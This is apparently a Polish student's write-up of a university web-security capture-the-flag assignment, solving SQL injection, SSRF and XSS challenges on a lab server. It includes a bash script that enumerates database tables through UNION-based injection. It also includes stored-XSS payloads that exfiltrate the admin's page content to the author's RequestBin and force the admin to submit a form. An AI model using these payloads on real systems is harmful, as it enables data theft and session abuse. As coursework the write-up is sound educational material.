# BSK* - zad. 1 (aplikacje webowe)

## 1. SQL Injection 
*FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7fc9f3b5bc9c065b3e6fdc4f4}*

Na podstronie `/stats/` to, co poda się dalej w adresie zostanie użyte jako parametr `X` w zapytaniu SQL postaci:
```
SELECT ... FROM ...
WHERE ...
AND year=X
ORDER BY ...
```
Wynik zapytania jest wstawiany do HTML-owej tabelki.
Gdy za `X` podstawi się `0 OR 0=1 UNION SELECT ...`, można dowiedzieć się ciekawych rzeczy.
Napisałem następujący skrypt, który listuje wszystkie nazwy tabel z bazy danych, zmieniając wartość `OFFSET` w zapytaniu.
```
#!/bin/bash

url="http://web.kazet.cc:31339/stats/0"
sql="OR 0=1 UNION SELECT table_name, 1 FROM information_schema.tables"

for i in {1..500}
do
    foo="$(wget -q -O - "${url} ${sql} OFFSET $i--" \
        | grep -A1 -m 1 "<td>1</td>" \
        | grep -v "<td>1</td>")"
    echo ${foo} | cut -c 5- | rev | cut -c 6- | rev
done
```
W ten sposób znalazłem tabelę o nazwie `interesting_and_secret_information`.
Następnie podobną metodą znalazłem nazwę kolumny w tej tabeli - `secret_text_for_example_a_flag`.
Wtedy już wystarczyło wyszukać 
```
http://web.kazet.cc:31339/stats/0 OR 0=1 UNION SELECT secret_text_for_example_a_flag, 1 FROM interesting_and_secret_information--
```
W tabelce na stronie wyświetlało się tylko kilkadziesiąt pierwszych znaków, dlatego żeby zdobyć końcówkę, zamieniłem `secret_text_for_example_a_flag` na `RIGHT(secret_text_for_example_a_flag, 50)`.

## 2. SSRF
*FLAG{0c55606a072a912d264846cd22c95020e781}*

Z kodu HTML strony dowiedziałem się, że przy jej ładowaniu wykonywany jest javascript, znajdujący się w `/static/script.js`. Funkcja getTime wysyła żądanie POST do podstrony `/time` z drugim argumentem tej funkcji jako parametrem body.
Przy pomocy Burpa przechwyciłem takie żądanie i zmieniłem wartość zmiennej `"timezone"` na `"london"`. Otrzymałem odpowiedź `nie udało się pobrać http://london.timezone.internal`. To znaczy, że dla `"timezone":"X"` pobierane są dane z wewnętrznego serwisu `http://X.timezone.internal`.
Gdy za `X` podstawiłem `127.0.0.0/?foo=`, z localhosta została pobrana flaga.

## 3. XSS
*FLAG{752e8db03d875cfec6bdf8305756f1bb}*

Zalogowałem się i przez podstronę `/send_article` wysyłałem dowolny tekst. Przechwyciłem żądanie POST i zmieniłem wartość parametru `"article"` na taki skrypt:
```
<script>
    fetch("[adres mojego RequestBina]", {
        method: "POST",
        body: document.body.innerHTML
    }); 
</script>
```
Skrypt został wklejony w kod strony, którą odczytał administrator. Skrypt się wykonał i na RequestBina został wysłany HTML strony administratora. Znajduje się tam link do podstrony `/send_feedback`.
Gdy zamiast `document.body.innerHTML` wstawiłem `document.URL`, otrzymałem w odpowiedzi adres `http://zad38-2022-final:5000`.
Wysyłałem kolejne spreparowane żądanie z następującym skryptem:
```
<script>
    fetch("http://zad38-2022-final:5000/send_feedback").then((response) => {
        return response.text();
    }).then(async (rt) => {
        await fetch("[adres mojego RequestBina]", {
            method: "POST",
            body: rt
        });
    }); 
</script>
```
Otrzymałem kod HTML podstrony `/send_feedback`. Dowiedziałem się z niego, że formularz do przesyłania odpowiedzi składa się z pól tekstowych `receiver` i `content` oraz checkboxa `debug`. Wysyłałem ostatnie żądanie, zmuszając stronę administratora do wysłania mi informacji zwrotnej, zawierającej flagę. Żeby wszystko działało poprawnie musiałem jeszcze zmienić znaki '&' na '%26'.
```
<script>
    fetch("http://zad38-2022-final:5000/send_feedback", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "receiver=[mój nick]%26content=foo%26debug=on"
    }); 
</script>
```
